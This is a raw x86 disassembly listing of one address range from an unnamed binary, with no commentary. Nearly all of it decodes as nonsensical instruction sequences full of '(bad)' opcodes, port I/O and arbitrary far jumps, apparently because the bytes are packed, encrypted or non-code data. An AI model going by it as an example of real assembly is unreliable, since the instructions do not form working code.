  40b338:	fnstsw WORD PTR [ecx]
  40b33a:	ds jmp 0x940a:0xf1e7e06a
  40b342:	lock in eax,dx
  40b344:	add    DWORD PTR [ebp+ecx*4+0x2b],esi
  40b348:	xor    al,0x8b
  40b34a:	psrad  mm7,mm6
  40b34d:	adc    edx,0xfffffff7
  40b350:	nop    edi
  40b353:	repz and ebx,DWORD PTR [ecx+0x40]
  40b357:	mov    ecx,es
  40b359:	call   0xeacc:0x4d194123
  40b360:	arpl   WORD PTR [edx+0x52932593],bp
  40b366:	mov    dh,0xf1
  40b368:	and    ax,0x93aa
  40b36c:	fs in  al,0xc8
  40b36f:	mov    al,ds:0x57fb1c39
  40b374:	scas   eax,DWORD PTR es:[edi]
  40b375:	sub    esi,DWORD PTR [eax]
  40b377:	inc    esi
  40b378:	out    0xcf,al
  40b37a:	scas   al,BYTE PTR es:[edi]
  40b37b:	jle    0x40b3b8
  40b37d:	push   esi
  40b37e:	repz data16 (bad) 
  40b381:	jnp    0x40b34d
  40b383:	stos   BYTE PTR es:[edi],al
  40b384:	push   es
  40b385:	es add ah,al
  40b388:	sbb    al,0xc6
  40b38a:	cmp    al,cl
  40b38c:	lods   eax,DWORD PTR ds:[esi]
  40b38d:	cmc    
  40b38e:	in     eax,dx
  40b38f:	fnstsw WORD PTR [ebx+0x65]
  40b392:	mov    ch,0x23
  40b394:	or     BYTE PTR [esi],0x3
  40b397:	jae    0x40b340
  40b399:	loop   0x40b40e
  40b39b:	stos   DWORD PTR es:[edi],eax
  40b39c:	lods   al,BYTE PTR ds:[esi]
  40b39d:	sbb    BYTE PTR [edx],cl
  40b39f:	enter  0xa40a,0x66
  40b3a3:	ins    BYTE PTR es:[edi],dx
  40b3a4:	in     al,0x4f
  40b3a6:	sub    cl,BYTE PTR [ecx+edx*2-0x6e5ddc44]
  40b3ad:	pushf  
  40b3ae:	dec    ebp
  40b3af:	sub    BYTE PTR [edi-0x27],dh
  40b3b2:	es cmp bl,bl
  40b3b5:	in     al,0x6a
  40b3b7:	sub    BYTE PTR ds:0x51a68fef,al
  40b3bd:	(bad)  
  40b3be:	add    eax,0x11f1b103
  40b3c3:	adc    ah,cl
  40b3c5:	dec    ebp
  40b3c6:	lods   eax,DWORD PTR ds:[esi]
  40b3c7:	es daa 
  40b3c9:	mov    eax,DWORD PTR [ebp+0x8]
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0xd7344c3d
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	push   cs
  40b3f1:	mov    ecx,0xa0b73aec
  40b3f6:	or     esi,esp
  40b3f8:	int3   
  40b3f9:	sub    DWORD PTR [esi+0x273bd014],edi
  40b3ff:	mov    WORD PTR [edi+ebp*4-0x6c],es
  40b403:	bndldx (bad),[esi-0x70]
  40b407:	fist   WORD PTR [edi+0x53]
  40b40a:	xchg   esi,eax
  40b40b:	imul   eax,ebx,0xd557d52c
  40b411:	sar    BYTE PTR [eax*4-0x297b1462],0x33
  40b419:	mov    eax,0x91b03b0d
  40b41e:	or     esp,DWORD PTR [ebx+eax*4]
  40b421:	pop    esp
  40b422:	jnp    0x40b42a
  40b424:	push   eax
  40b425:	and    dl,BYTE PTR [edx]
  40b427:	out    dx,eax
  40b428:	push   0xa555ce27
  40b42d:	data16 lock mov ah,0x45
  40b431:	fidiv  DWORD PTR ds:0xb71f058d
  40b437:	leave  
  40b438:	iret   
  40b439:	pop    ss
  40b43a:	in     eax,0x36
  40b43c:	and    al,0x74
  40b43e:	repnz (bad) 
  40b441:	cmp    ebx,DWORD PTR [edi]
  40b443:	add    edi,DWORD PTR [eax]
  40b445:	push   0x41d3a8a2
  40b44a:	out    0x6b,al
  40b44c:	pop    ecx
  40b44d:	ret    0x57e3
  40b450:	inc    eax
  40b451:	xchg   ebx,eax
  40b452:	xchg   DWORD PTR [ecx+0x1502c6f2],eax
  40b458:	and    eax,0x4b5a34b7
  40b45d:	add    bh,bh
  40b45f:	jecxz  0x40b432
  40b461:	or     ax,0xb11e
  40b465:	xor    DWORD PTR [ecx-0x6a],eax
  40b468:	aam    0x2b
  40b46a:	mov    WORD PTR [edi+edi*1],?
  40b46d:	daa    
  40b46e:	and    eax,0x6a71cabe
  40b473:	(bad)  
  40b474:	imul   esp,DWORD PTR [ebx],0xffffff9e
  40b477:	adc    al,0xf5
  40b479:	pop    esi
  40b47a:	xor    eax,0x242ed0b2
  40b47f:	aam    0xfe
  40b481:	fidiv  DWORD PTR [edx]
  40b483:	inc    ebx
  40b484:	push   ecx
  40b485:	push   cs
  40b486:	fidiv  DWORD PTR [ebp-0x208102d9]
  40b48c:	add    al,0x9d
  40b48e:	lods   al,BYTE PTR ds:[esi]
  40b48f:	imul   DWORD PTR [ebx+0x66698688]
  40b495:	jg     0x40b4ab
  40b497:	out    dx,eax
  40b498:	dec    edx
  40b499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b49a:	(bad)  
  40b49b:	dec    esp
  40b49c:	(bad)
  40b49f:	inc    ebx
  40b4a0:	loop   0x40b4f3
  40b4a2:	mov    eax,0x73fe0208
  40b4a7:	mov    bl,0xaa
  40b4a9:	inc    ebx
  40b4aa:	or     ebx,DWORD PTR [esi+0x443891ee]
  40b4b0:	aad    0x30
  40b4b2:	loopne 0x40b531
  40b4b4:	or     BYTE PTR [eax+0x43],ch
  40b4b7:	xchg   ecx,eax
  40b4b8:	jne    0x40b4ad
  40b4ba:	cmc    
  40b4bb:	in     al,dx
  40b4bc:	inc    ebp
  40b4bd:	out    dx,eax
  40b4be:	mov    ebp,0x79005f39
  40b4c3:	push   edx
  40b4c4:	adc    eax,0xd457c7e9
  40b4c9:	xchg   edx,eax
  40b4ca:	push   edi
  40b4cb:	fiadd  DWORD PTR [edi+0x35]
  40b4ce:	(bad)  [edi+0x25f0d7d1]
  40b4d4:	(bad)  
  40b4d5:	xchg   ecx,eax
  40b4d6:	stos   BYTE PTR es:[edi],al
  40b4d7:	test   ch,0x75
  40b4da:	adc    edi,esp
  40b4dc:	mov    cl,0xb5
  40b4de:	jg     0x40b54a
  40b4e0:	aad    0xbd
  40b4e2:	push   0x1d
  40b4e4:	ins    DWORD PTR es:[edi],dx
  40b4e5:	outs   dx,BYTE PTR ds:[esi]
  40b4e6:	std    
  40b4e7:	loopne 0x40b4be
  40b4e9:	cmp    eax,0xbca4525a
  40b4ee:	adc    ah,BYTE PTR [ebx+0x6c5a34b]
  40b4f4:	adc    DWORD PTR ds:0x2f577ddb,ecx
  40b4fa:	popf   
  40b4fb:	xchg   ecx,eax
  40b4fc:	ret    0x3e0f
  40b4ff:	ins    BYTE PTR es:[edi],dx
  40b500:	popf   
  40b501:	mov    ch,0x57
  40b503:	jecxz  0x40b4bc
  40b505:	mov    dh,0x2f
  40b507:	aam    0xd4
  40b509:	ret    
  40b50a:	mov    esi,0xbddcd057
  40b50f:	rol    ebx,0x7a
  40b512:	push   ebx
  40b513:	jge    0x40b571
  40b515:	ins    DWORD PTR es:[edi],dx
  40b516:	or     al,0xb2
  40b518:	inc    edx
  40b519:	cld    
  40b51a:	sub    eax,0x49a18317
  40b51f:	dec    esp
  40b520:	nop
  40b521:	push   edi
  40b522:	mov    bl,0x55
  40b524:	lahf   
  40b525:	adc    BYTE PTR [edx+0x6ac19de1],al
  40b52b:	xor    ecx,0xfc5c839
  40b531:	pop    ecx
  40b532:	repnz leave 
  40b534:	jle    0x40b4fb
  40b536:	mov    ebp,0x4c3ca0a9
  40b53b:	inc    esp
  40b53c:	pop    ds
  40b53d:	cmp    al,0x5e
  40b53f:	fcomp  DWORD PTR [ecx-0x46996dc7]
  40b545:	mov    ds:0x646adbb7,al
  40b54a:	outs   dx,BYTE PTR ds:[esi]
  40b54b:	mov    al,ds:0x985a9843
  40b550:	es sahf 
  40b552:	xchg   ebx,eax
  40b553:	dec    ebx
  40b554:	xor    edi,ebx
  40b556:	ret    
  40b557:	adc    eax,0xbc7d30d5
  40b55c:	inc    esp
  40b55d:	outs   dx,BYTE PTR ds:[esi]
  40b55e:	lahf   
  40b55f:	jl     0x40b518
  40b561:	inc    esp
  40b562:	jo     0x40b52f
  40b564:	jp     0x40b58f
  40b566:	and    DWORD PTR [esi+0x16],ecx
  40b569:	popa   
  40b56a:	ins    DWORD PTR es:[edi],dx
  40b56b:	aaa    
  40b56c:	cwde   
  40b56d:	stos   DWORD PTR es:[edi],eax
  40b56e:	frstor [eax-0x542f1503]
  40b574:	dec    edi
  40b575:	xor    eax,DWORD PTR [ecx+0x2889a27e]
  40b57b:	add    al,0x17
  40b57d:	push   esi
  40b57e:	push   ds
  40b57f:	dec    edx
  40b580:	stos   BYTE PTR es:[edi],al
  40b581:	and    eax,0xf7ee3662
  40b586:	push   cs
  40b587:	js     0x40b591
  40b589:	sbb    al,0x5a
  40b58b:	das    
  40b58c:	or     esp,eax
  40b58e:	push   cs
  40b58f:	inc    esp
  40b590:	sti    
  40b591:	lods   al,BYTE PTR ds:[esi]
  40b592:	scas   eax,DWORD PTR es:[edi]
  40b593:	sbb    ebp,DWORD PTR [esi]
  40b595:	xor    eax,0x94f9afb1
  40b59a:	mov    edi,0xe2d37283
  40b59f:	dec    ecx
  40b5a0:	jge    0x40b60d
  40b5a2:	cli    
  40b5a3:	daa    
  40b5a4:	das    
  40b5a5:	lds    edx,FWORD PTR [edi]
  40b5a7:	mov    edi,DWORD PTR ds:[ebx-0x71]
  40b5ab:	add    BYTE PTR ds:0xcb4fe63a,bl
  40b5b1:	(bad)  
  40b5b2:	pop    ds
  40b5b3:	loope  0x40b584
  40b5b5:	xchg   ecx,eax
  40b5b6:	pop    edi
  40b5b7:	sahf   
  40b5b8:	sbb    ebp,ebp
  40b5ba:	sub    eax,0xe45dbace
  40b5bf:	jl     0x40b543
  40b5c1:	push   es
  40b5c2:	lods   eax,DWORD PTR ds:[esi]
  40b5c3:	fstp   st(2)
  40b5c5:	add    ch,ah
  40b5c7:	xor    BYTE PTR [edx-0x4f],dl
  40b5ca:	fld    TBYTE PTR [ebx+0x60]
  40b5cd:	lods   eax,DWORD PTR ds:[esi]
  40b5ce:	adc    ebp,0xffffffc9
  40b5d1:	punpcklbw mm5,DWORD PTR [ebp-0x16dffbb5]
  40b5d8:	test   al,0xf5
  40b5da:	clc    
  40b5db:	addr16 cwde 
  40b5dd:	pusha  
  40b5de:	les    edi,FWORD PTR [eax-0x62dc2108]
  40b5e4:	xchg   BYTE PTR [edi],cl
  40b5e6:	or     eax,0xad6e215e
  40b5eb:	dec    ebx
  40b5ec:	pop    DWORD PTR [edx+0x6e940dd]
  40b5f2:	push   ebp
  40b5f3:	sti    
  40b5f4:	xor    DWORD PTR [esi],0x2b1d7300
  40b5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5fc:	shl    esp,0xb6
  40b5ff:	mov    esp,DWORD PTR [ebx]
  40b601:	sub    DWORD PTR [edx+0x17cf5e58],0xfffffffa
  40b608:	mov    ds,WORD PTR [esi]
  40b60a:	add    eax,0x8c015e02
  40b60f:	data16 aad 0xfe
  40b612:	dec    ecx
  40b613:	cmp    bl,bh
  40b615:	sub    bl,BYTE PTR [ecx+0x14]
  40b618:	aam    0xd
  40b61a:	ins    BYTE PTR es:[edi],dx
  40b61b:	pop    esi
  40b61c:	(bad)  
  40b61d:	mov    esi,0xf6a7ef49
  40b622:	sbb    DWORD PTR [ecx],ecx
  40b624:	es or  al,0xd2
  40b627:	and    bh,al
  40b629:	rol    BYTE PTR [esi+0x31599e54],0x56
  40b630:	shr    BYTE PTR ds:0x2d4fafd6,0xad
  40b637:	jmp    0xde3f:0x717c7412
  40b63e:	push   eax
  40b63f:	mov    DWORD PTR ds:0xeb842c9f,ecx
  40b645:	push   edx
  40b646:	enter  0x199d,0x30
  40b64a:	dec    eax
  40b64b:	push   cs
  40b64c:	inc    edi
  40b64d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b64e:	sbb    al,0xbc
  40b650:	xor    DWORD PTR gs:[eax],esp
  40b653:	je     0x40b6ac
  40b655:	cwde   
  40b656:	inc    esi
  40b657:	(bad)  
  40b659:	xchg   edi,eax
  40b65a:	test   al,0xc5
  40b65c:	jmp    0xc1fb:0x547f8d56
  40b663:	pop    ebx
  40b664:	mov    bh,0xa5
  40b666:	mov    ds:0xadc4128a,eax
  40b66b:	loop   0x40b5fa
  40b66d:	loop   0x40b6d4
  40b66f:	dec    esp
  40b670:	popa   
  40b671:	loopne 0x40b668
  40b673:	shl    BYTE PTR ds:0x4ca05618,1
  40b679:	fild   WORD PTR [ebx+0x15]
  40b67c:	mov    ch,dh
  40b67e:	pop    ecx
  40b67f:	lods   al,BYTE PTR ds:[esi]
  40b680:	sub    eax,0xa14e4bfd
  40b685:	jbe    0x40b676
  40b687:	and    al,0x14
  40b689:	cwde   
  40b68a:	lock into 
  40b68c:	out    0x9f,eax
  40b68e:	aad    0x41
  40b690:	mov    eax,0x3254c4ba
  40b695:	jmp    DWORD PTR [esi]
  40b697:	or     ebx,DWORD PTR [edx+0x74f1cf0f]
  40b69d:	mov    bh,0x6a
  40b69f:	inc    ebp
  40b6a0:	cdq    
  40b6a1:	(bad)
  40b6a5:	add    eax,0xe7e42108
  40b6aa:	adc    BYTE PTR [esi],bh
  40b6ac:	mov    bl,dl
  40b6ae:	mov    edi,fs
  40b6b0:	aas    
  40b6b1:	rcr    bl,cl
  40b6b3:	inc    ebp
  40b6b4:	stc    
  40b6b5:	in     al,0x98
  40b6b7:	pop    ebp
  40b6b8:	imul   edi,esp,0x9aac8459
  40b6be:	bound  esp,QWORD PTR [ebp-0x59]
  40b6c1:	scas   eax,DWORD PTR es:[edi]
  40b6c2:	xor    BYTE PTR [edi],al
  40b6c4:	pop    es
  40b6c5:	std    
  40b6c6:	in     eax,dx
  40b6c7:	pop    es
  40b6c8:	imul   esi,ebx,0xc3ca5133
  40b6ce:	test   DWORD PTR [ecx+0x26],ecx
  40b6d1:	adc    DWORD PTR [ecx-0x5a],0x7e0a2df9
  40b6d8:	sbb    al,bh
  40b6da:	inc    esp
  40b6db:	and    BYTE PTR [ebp-0x70b26309],al
  40b6e1:	in     eax,0xdb
  40b6e3:	jge    0x40b6d8
  40b6e5:	dec    edx
  40b6e6:	xchg   ebp,eax
  40b6e7:	pop    DWORD PTR [ebx-0x23683315]
  40b6ed:	sbb    al,0xf6
  40b6ef:	int3   
  40b6f0:	test   BYTE PTR [eax],dl
  40b6f2:	mov    ebp,esi
  40b6f4:	mov    DWORD PTR [ecx],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [esi+edi*2-0x7eb9d07],ds
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	imul   ebx,DWORD PTR [eax+0x6a],0xd7c91323
  40b72b:	das    
  40b72c:	pusha  
  40b72d:	fidiv  DWORD PTR [ebx]
  40b72f:	out    dx,al
  40b730:	arpl   ax,di
  40b732:	(bad)  
  40b733:	jl     0x40b759
  40b735:	fs push ebp
  40b737:	pop    eax
  40b738:	mov    esp,0x27c4a702
  40b73d:	(bad)  
  40b73e:	(bad)  
  40b73f:	push   0x45
  40b741:	sbb    al,0xa1
  40b743:	mov    bl,0x1c
  40b745:	popa   
  40b746:	test   al,0x85
  40b748:	pushf  
  40b749:	xchg   esi,eax
  40b74a:	sbb    bh,BYTE PTR [eax]
  40b74c:	and    eax,0xc06b89c9
  40b751:	jno    0x40b7a0
  40b753:	sar    DWORD PTR [ebx+0x2b2b36da],0x62
  40b75a:	sub    DWORD PTR [edx-0xd],ecx
  40b75d:	push   esp
  40b75e:	xlat   BYTE PTR ds:[ebx]
  40b75f:	inc    esi
  40b760:	xor    edx,DWORD PTR [esi+edi*2-0x7e]
  40b764:	adc    al,0x4e
  40b766:	mov    bh,0x30
  40b768:	jne    0x40b7e3
  40b76a:	inc    esi
  40b76b:	rcl    BYTE PTR [esi-0x15],0xbe
  40b76f:	clc    
  40b770:	fistp  WORD PTR [edi]
  40b772:	or     al,0x9b
  40b774:	adc    eax,0xd2bd5b0c
  40b779:	out    0x84,al
  40b77b:	(bad)  
  40b77d:	pop    esp
  40b77e:	clc    
  40b77f:	ret    0xa562
  40b782:	js     0x40b748
  40b784:	and    al,0x13
  40b786:	or     DWORD PTR [eax+ebp*4],ecx
  40b789:	xchg   esp,edi
  40b78b:	mov    esp,0xedc322bf
  40b790:	ret    0xaa45
  40b793:	lahf   
  40b794:	pop    esi
  40b795:	xchg   esi,eax
  40b796:	pop    edi
  40b797:	aad    0x15
  40b799:	jnp    0x40b762
  40b79b:	loope  0x40b809
  40b79d:	dec    edi
  40b79e:	cmp    ecx,ecx
  40b7a0:	pop    ss
  40b7a1:	rol    BYTE PTR [edi-0x20],0xe9
  40b7a5:	inc    ecx
  40b7a6:	mov    edi,0x8543e27e
  40b7ac:	repnz push 0xffffffce
  40b7af:	xor    eax,0xbf14e862
  40b7b4:	push   0x7d59c19
  40b7b9:	inc    edi
  40b7ba:	mov    ds:0x2441ca74,al
  40b7bf:	pop    ds
  40b7c0:	jl     0x40b7f3
  40b7c2:	and    eax,0xc0fad1a6
  40b7c7:	pop    ebx
  40b7c8:	js     0x40b796
  40b7ca:	or     BYTE PTR [ebp-0x2ef4ddd0],0xc2
  40b7d1:	and    BYTE PTR [eax],dl
  40b7d3:	xchg   BYTE PTR ds:0x24d9fb00,bl
  40b7d9:	add    eax,DWORD PTR [esi+0x5]
  40b7dc:	scas   al,BYTE PTR es:[edi]
  40b7dd:	mov    bh,0x27
  40b7df:	inc    edi
  40b7e0:	inc    ebx
  40b7e1:	pop    esp
  40b7e2:	add    dh,cl
  40b7e4:	mov    BYTE PTR [ebx-0x7435f3b5],ch
  40b7ea:	push   ds
  40b7eb:	mov    edx,0xdafc5c5d
  40b7f0:	dec    esi
  40b7f1:	push   eax
  40b7f2:	pop    ds
  40b7f3:	xlat   BYTE PTR ds:[ebx]
  40b7f4:	shl    DWORD PTR [esi+0x564539bc],cl
  40b7fa:	inc    eax
  40b7fb:	call   0x342c5917
  40b800:	ror    edi,cl
  40b802:	push   ebx
  40b803:	dec    ebx
  40b804:	in     al,dx
  40b805:	add    esp,DWORD PTR [ecx]
  40b807:	or     DWORD PTR [edi-0x66],edx
  40b80a:	jae    0x40b883
  40b80c:	or     cl,BYTE PTR [esi+0x42]
  40b80f:	ret    0x9f3b
  40b812:	and    ch,bh
  40b814:	iret   
  40b815:	gs adc eax,0xfdb6b0a5
  40b81b:	aas    
  40b81c:	sub    dl,dh
  40b81e:	xchg   BYTE PTR [eax-0xe99c8b5],bh
  40b824:	sar    ecx,0xc9
  40b827:	inc    edi
  40b828:	cmc    
  40b829:	pmullw mm2,QWORD PTR [edi]
  40b82c:	inc    ebx
  40b82d:	rcl    DWORD PTR [ebx+ebx*8],1
  40b830:	not    DWORD PTR [edx]
  40b832:	mov    ds:0xfc415d35,eax
  40b837:	icebp  
  40b838:	mov    al,ds:0xba9f19cd
  40b83d:	jns    0x40b7f5
  40b83f:	sbb    ch,dh
  40b841:	fldenv [edx]
  40b843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b844:	in     eax,0xf
  40b846:	push   ecx
  40b847:	loope  0x40b82a
  40b849:	jo     0x40b8b8
  40b84b:	data16 scas al,BYTE PTR es:[di]
  40b84e:	xor    dh,BYTE PTR [ebx+0x40]
  40b851:	data16 or al,0xfe
  40b854:	push   ebx
  40b855:	mov    bl,0x7b
  40b857:	test   BYTE PTR [eax],cl
  40b859:	and    dh,BYTE PTR [edi+0x4d]
  40b85c:	stos   DWORD PTR es:[edi],eax
  40b85d:	int3   
  40b85e:	mov    esp,?
  40b860:	xchg   DWORD PTR ds:[ebx+0x70],esp
  40b864:	mov    bl,0x5c
  40b866:	jns    0x40b8ad
  40b868:	push   edi
  40b869:	lahf   
  40b86a:	ficom  WORD PTR [ebp-0x5a]
  40b86d:	inc    edx
  40b86e:	lock icebp 
  40b870:	cmc    
  40b871:	mov    bh,0x38
  40b873:	xor    ebp,DWORD PTR [edi+0x6c1e7e22]
  40b879:	bound  esp,QWORD PTR [edi-0xe]
  40b87c:	pop    ebx
  40b87d:	mov    ebp,0x1ead2b9c
  40b882:	stos   BYTE PTR es:[edi],al
  40b883:	mov    ebx,0x1a3668d4
  40b888:	push   esp
  40b889:	sbb    bl,BYTE PTR [ebx]
  40b88b:	xor    eax,0x5224d624
  40b890:	gs xchg edi,eax
  40b892:	and    BYTE PTR [esi],dl
  40b894:	push   ss
  40b895:	sbb    DWORD PTR [ecx+0x50a198ca],edx
  40b89b:	lods   al,BYTE PTR ds:[esi]
  40b89c:	add    eax,0x7657ca6d
  40b8a1:	jge    0x40b827
  40b8a3:	int3   
  40b8a4:	hlt    
  40b8a5:	stos   DWORD PTR es:[edi],eax
  40b8a6:	sbb    dh,BYTE PTR [edx]
  40b8a8:	jbe    0x40b893
  40b8aa:	xchg   DWORD PTR [esi+edx*2+0x5335ce0b],ecx
  40b8b1:	xchg   esi,eax
  40b8b2:	pop    ebx
  40b8b3:	fsub   DWORD PTR [ecx]
  40b8b5:	adc    DWORD PTR [edi-0x113e4a35],ebx
  40b8bb:	xchg   esp,eax
  40b8bc:	outs   dx,DWORD PTR ds:[esi]
  40b8bd:	and    DWORD PTR ds:0x21ceb25e,esp
  40b8c3:	pop    esp
  40b8c4:	pop    ss
  40b8c5:	pop    esp
  40b8c6:	and    BYTE PTR [ebx-0xa],0x2c
  40b8ca:	jno    0x40b850
  40b8cc:	add    DWORD PTR [ebx-0x2d129d83],ecx
  40b8d2:	adc    DWORD PTR [ecx],esp
  40b8d4:	adc    al,bl
  40b8d6:	cmp    eax,0x8839e996
  40b8db:	retf   
  40b8dc:	and    eax,0x3314e7c7
  40b8e1:	xchg   esp,eax
  40b8e2:	jp     0x40b8ab
  40b8e4:	pop    ebx
  40b8e5:	inc    edi
  40b8e6:	sbb    edx,DWORD PTR [eax]
  40b8e8:	mov    ch,0x2
  40b8ea:	sub    edx,DWORD PTR [esi+0x45771fc]
  40b8f0:	mul    DWORD PTR [edx+0x3aa6b8ab]
  40b8f6:	imul   esp,DWORD PTR [ecx-0x2ea7625e],0xfffffff1
  40b8fd:	push   edx
  40b8fe:	jmp    0x414:0x4f1621b4
  40b905:	lds    esi,FWORD PTR cs:[ebx+0x7e936730]
  40b90c:	cmc    
  40b90d:	ficom  DWORD PTR [ebx]
  40b90f:	xchg   DWORD PTR [eax-0x35cc3f97],edi
  40b915:	and    cl,BYTE PTR [ecx-0x50]
  40b918:	repz mov bl,0x87
  40b91b:	fisub  DWORD PTR [edi+0x63]
  40b91e:	and    edx,DWORD PTR [eax-0x2c5de221]
  40b924:	mov    ch,0x8f
  40b926:	fmul   st(0),st
  40b928:	fcomp  DWORD PTR [esi+ebx*8]
  40b92b:	mov    edx,0xd23b3e87
  40b930:	popa   
  40b931:	call   0xe184:0xe8ae0b59
  40b938:	inc    ecx
  40b939:	cmp    ebp,DWORD PTR [edi-0x16788303]
  40b93f:	xor    dl,BYTE PTR [ebp+edx*1-0x4b]
  40b943:	pop    ebp
  40b944:	dec    ecx
  40b945:	jmp    0x40b995
  40b947:	mov    cl,0x50
  40b949:	shr    BYTE PTR [eax],0xdb
  40b94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b94d:	mov    DWORD PTR [esp+edi*4+0x21f1c65c],ecx
  40b954:	mov    esp,0xc4233549
  40b959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b95a:	adc    DWORD PTR ds:0x77fc951b,ecx
  40b960:	sbb    esp,ebp
  40b962:	fmulp  st(4),st
  40b964:	retf   
  40b965:	fwait
  40b966:	push   ebx
  40b967:	add    BYTE PTR [ebp+0x4c],bl
  40b96a:	or     ebp,DWORD PTR [ebx-0x36ddb3f0]
  40b970:	xor    bh,BYTE PTR [esi-0x748f9cb0]
  40b976:	sbb    eax,0x45cf0731
  40b97b:	pop    ecx
  40b97c:	push   0x81ea6974
  40b981:	(bad)  
  40b982:	out    dx,eax
  40b983:	call   FWORD PTR [esi]
  40b985:	daa    
  40b986:	dec    edx
  40b987:	test   DWORD PTR [ebp+0x33],ebp
  40b98a:	not    DWORD PTR [ecx-0x43714a23]
  40b990:	xchg   ebp,eax
  40b991:	and    eax,0x8d4ac063
  40b996:	jbe    0x40b9e6
  40b998:	aas    
  40b999:	jle    0x40b968
  40b99b:	mov    cl,0x61
  40b99d:	aad    0x83
  40b99f:	retf   0x9df2
  40b9a2:	outs   dx,BYTE PTR ds:[esi]
  40b9a3:	mov    al,ds:0xd66d373f
  40b9a8:	and    DWORD PTR [ebp-0x4c],esi
  40b9ab:	dec    ecx
  40b9ac:	mul    esp
  40b9ae:	sub    al,BYTE PTR [edi+0x39]
  40b9b1:	std    
  40b9b2:	test   DWORD PTR [esi+eax*8],esp
  40b9b5:	sub    DWORD PTR [edx+0x35],esp
  40b9b8:	call   0x73f93e7d
  40b9bd:	sbb    dl,BYTE PTR [esi]
  40b9bf:	aaa    
  40b9c0:	(bad)  
  40b9c2:	shl    edx,cl
  40b9c4:	inc    eax
  40b9c5:	push   ss
  40b9c6:	adc    ebx,DWORD PTR [esi-0x49602ac1]
  40b9cc:	sub    BYTE PTR [eax],ch
  40b9ce:	test   BYTE PTR ds:0xe8f2bf9c,ch
  40b9d4:	enter  0xdef,0xe
  40b9d8:	add    ecx,ebp
  40b9da:	pusha  
  40b9db:	ja     0x40ba07
  40b9dd:	mov    eax,0xa14fef4b
  40b9e2:	adc    eax,0xdf146d33
  40b9e7:	push   esi
  40b9e8:	dec    edi
  40b9e9:	xlat   BYTE PTR ds:[ebx]
  40b9ea:	clc    
  40b9eb:	sar    DWORD PTR [edi],0xe1
  40b9ee:	inc    ebx
  40b9ef:	mov    bl,0xc9
  40b9f1:	push   esp
  40b9f2:	xchg   ebx,eax
  40b9f3:	shl    dl,cl
  40b9f5:	jo     0x40b9dc
  40b9f7:	jne    0x40b9bf
  40b9f9:	fisubr WORD PTR [eax-0x42f3ee8b]
  40b9ff:	repnz push cs
  40ba01:	inc    edx
  40ba02:	rol    DWORD PTR [edi+0x31],cl
  40ba05:	xchg   BYTE PTR [eax],dh
  40ba07:	je     0x40b9bf
  40ba09:	nop
  40ba0a:	mov    esp,0x92931f9d
  40ba0f:	or     DWORD PTR [ebx-0x751f7019],esi
  40ba15:	dec    esi
  40ba16:	dec    edx
  40ba17:	xchg   ebx,eax
  40ba18:	add    esi,ebp
  40ba1a:	fs pop ss
  40ba1c:	call   0xaa1f:0xf8fa9908
  40ba23:	xlat   BYTE PTR ds:[ebx]
  40ba24:	jno    0x40ba72
  40ba26:	xchg   edi,eax
  40ba27:	sub    eax,0x8bf8458b
  40ba2c:	dec    ebp
  40ba2d:	call   0x43d71b
  40ba32:	add    BYTE PTR [ebp+edi*2+0x7555f44c],dl
  40ba39:	mov    ah,0x5d
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    bl,BYTE PTR [ebx]
  40ba40:	imul   esi,DWORD PTR [ebx-0x3a],0x7e7e8710
  40ba47:	jp     0x40bac6
  40ba49:	jle    0x40bac9
  40ba4b:	cmp    BYTE PTR [edi-0x3638bb8],dl
  40ba51:	aaa    
  40ba52:	ja     0x40ba59
  40ba54:	icebp  
  40ba55:	ins    BYTE PTR es:[edi],dx
  40ba56:	test   eax,0xee77bb66
  40ba5b:	outs   dx,BYTE PTR ds:[esi]
  40ba5c:	into   
  40ba5d:	inc    eax
  40ba5e:	cmc    
  40ba5f:	sub    ecx,DWORD PTR cs:[ebx]
  40ba62:	out    0xe5,al
  40ba64:	stos   DWORD PTR es:[edi],eax
  40ba65:	cld    
  40ba66:	jmp    0x40ba2f
  40ba68:	std    
  40ba69:	push   0xffffffa5
  40ba6b:	cmp    bh,BYTE PTR [ecx-0x2f41d834]
  40ba71:	js     0x40ba07
  40ba73:	push   ebp
  40ba74:	(bad)  
  40ba75:	loop   0x40ba43
  40ba77:	xor    eax,0x3a272393
  40ba7c:	jg     0x40ba0a
  40ba7e:	(bad)  
  40ba7f:	ror    DWORD PTR [edi-0x25],1
  40ba82:	xchg   edx,eax
  40ba83:	push   0x48c319ac
  40ba88:	(bad)  
  40ba89:	cs loope 0x40ba93
  40ba8c:	(bad)  
  40ba8d:	mov    ebx,0x36771b2c
  40ba92:	sahf   
  40ba93:	test   BYTE PTR [ebp+0x6530de83],ch
  40ba99:	popa   
  40ba9a:	and    esp,ebx
  40ba9c:	vpaddb xmm5,xmm4,xmm2
  40baa0:	call   0x344e:0xe234917
  40baa7:	pop    esi
  40baa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baa9:	dec    eax
  40baaa:	xchg   edx,eax
  40baab:	out    dx,eax
  40baac:	push   ss
  40baad:	mov    cl,0xd8
  40baaf:	rol    BYTE PTR [edx+eax*1+0x5e],0x9b
